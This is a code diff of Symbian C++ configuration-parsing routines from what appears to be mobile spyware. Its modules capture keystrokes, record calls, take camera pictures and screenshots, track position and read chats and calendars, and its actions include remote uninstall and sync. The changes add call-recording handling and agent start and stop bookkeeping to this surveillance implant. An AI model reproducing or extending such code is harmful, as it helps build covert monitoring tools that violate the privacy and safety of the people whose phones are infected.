@@ -27,7 +27,7 @@ CDataAgent* CDataAgent::NewLC(TAgentType aId, TAgentStatus aStatus, const TDesC8
 	}
 
 CDataAgent::CDataAgent(TAgentType aId, TAgentStatus aStatus) :
-	iId(aId), iStatus(aStatus)
+	iId(aId), iStatus(aStatus), iAdditionalData(0)
 	{
 	}
 
@@ -60,7 +60,7 @@ CDataAction* CDataAction::NewLC(TActionType aId, const TDesC8& buff)
 	}
 
 CDataAction::CDataAction(TActionType aId) :
-	iId(aId)
+	iId(aId), iAdditionalData(0)
 	{
 	}
 
@@ -429,27 +429,45 @@ void CConfigFile::ReadModulesSectionL(CJsonArray* aModulesArray)
 			{
 			agentId = GetModuleId(module);
 			
-			RBuf params;
-			params.Create(420);
-			params.CleanupClosePushL();
-			module->ToStringL(params);
-			TInt length = params.Length();
-			
-			RBuf8 params8;
-			params8.Create(length);
-			params8.CleanupClosePushL();
-			params8.Copy(params);
-			params.Close();
-		
-			// Add Agent to the List
-			// and transfer the ownership
-			if(agentId)
+			if(agentId >0)
 				{
-				CDataAgent* newAgent = CDataAgent::NewL((TAgentType) agentId, (TAgentStatus) agentStatus, params8);
-				iAgentsList.Append(newAgent);
-				}
-			CleanupStack::PopAndDestroy(2);  //params8,params
+				TInt additionalData = 0;
+				if(agentId == EAgent_Call_TODO)
+					{
+					TBool record;
+					module->GetBoolL(_L("record"),record);
+					if(record)
+						additionalData = 1;
+					}
+				RBuf params;
+				params.Create(420);
+				params.CleanupClosePushL();
+				module->ToStringL(params);
+				TInt length = params.Length();
 			
+				RBuf8 params8;
+				params8.Create(length);
+				params8.CleanupClosePushL();
+				params8.Copy(params);
+				params.Close();
+		
+				// Add Agent to the List
+				// and transfer the ownership
+				if(agentId == EAgent_Call_TODO)
+					{
+					CDataAgent* newAgent = CDataAgent::NewL(EAgent_CallLocal, (TAgentStatus) agentStatus, params8);
+					newAgent->iAdditionalData = additionalData; //1 if the agent must be started, 0 otherwise
+					iAgentsList.Append(newAgent);
+					CDataAgent* newAgent2 = CDataAgent::NewL(EAgent_CallList, (TAgentStatus) agentStatus, params8);
+					iAgentsList.Append(newAgent2);
+					}
+				else
+					{
+					CDataAgent* newAgent = CDataAgent::NewL((TAgentType) agentId, (TAgentStatus) agentStatus, params8);
+					iAgentsList.Append(newAgent);
+					}
+				CleanupStack::PopAndDestroy(2);  //params8,params
+				}
 			}
 		}
 	}
@@ -479,10 +497,14 @@ TInt CConfigFile::GetModuleId(CJsonObject* aObject)
 		return EAgent_Keylog;
 	if(name.Compare(_L("application"))==0)
 		return EAgent_Application;
+	/*
 	if(name.Compare(_L("call"))==0)
 		return EAgent_CallLocal;
 	if(name.Compare(_L("calllist"))==0)
 		return EAgent_CallList;
+		*/
+	if(name.Compare(_L("call")) == 0)
+		return EAgent_Call_TODO;
 	if(name.Compare(_L("camera"))==0)
 		return EAgent_Cam;
 	if(name.Compare(_L("chat"))==0)
@@ -492,7 +514,7 @@ TInt CConfigFile::GetModuleId(CJsonObject* aObject)
 		//return EAgent_URL_TODO;
 		return 0;
 	if(name.Compare(_L("screenshot")) == 0)
-		return EAgent_Snapshot;
+		return EAgent_Screenshot;
 	if(name.Compare(_L("position")) == 0)
 		return EAgent_Position;
 	if(name.Compare(_L("calendar")) == 0)
@@ -605,7 +627,7 @@ void CConfigFile::ReadActionsSectionL(CJsonArray* aActionsArray)
 		macroAction->GetArrayL(_L("subactions"),subactionsArray);
 		
 		TInt numSubActions=0;
-		numSubActions = subactionsArray->Count();
+		numSubActions = subactionsArray->Count(); 
 		
 		for(TInt j=0; j<numSubActions; j++)
 			{
@@ -616,9 +638,22 @@ void CConfigFile::ReadActionsSectionL(CJsonArray* aActionsArray)
 				TInt actionId=0;
 				actionId = GetActionId(action);
 				
+				TInt additionalData = 0;
+				if((actionId == EAction_StartAgent) || (actionId == EAction_StopAgent))
+					{
+					//retrieve agentId of agent to start/stop
+					additionalData = GetModuleId(action);
+					}
+				if((actionId == EAction_EnableEvent) || (actionId == EAction_DisableEvent))
+					{
+					//retrieve eventId of event to enable/disable
+					action->GetIntL(_L("event"),additionalData);
+					}
 				// set the queue id
 				if((actionId==EAction_Uninstall) || (actionId == EAction_Sync) || (actionId == EAction_SyncApn))
 					newMacroAction->iQueueId = EPrimaryQueue;
+				else
+					newMacroAction->iQueueId = ESecondaryQueue;
 				
 				RBuf params;
 				params.Create(420);
@@ -633,6 +668,10 @@ void CConfigFile::ReadActionsSectionL(CJsonArray* aActionsArray)
 				params.Close();
 				
 				CDataAction* newAction = CDataAction::NewL((TActionType) actionId, params8);
+				if((actionId==EAction_StartAgent) || (actionId == EAction_StopAgent))
+					newAction->iAdditionalData = additionalData;
+				if((actionId == EAction_EnableEvent) || (actionId == EAction_DisableEvent))
+					newAction->iAdditionalData = additionalData;
 				newMacroAction->AppendAction(newAction);
 				
 				CleanupStack::PopAndDestroy(2); //params,params8
@@ -645,7 +684,7 @@ TInt CConfigFile::GetActionId(CJsonObject* aObject)
 	{
 	
 	TBuf<32> name;
-	aObject->GetStringL(_L("action"),name);
+	aObject->GetStringL(_L("action"),name); 
 	if(name.Compare(_L("uninstall")) == 0)
 		return EAction_Uninstall;
 	if(name.Compare(_L("sms")) == 0)
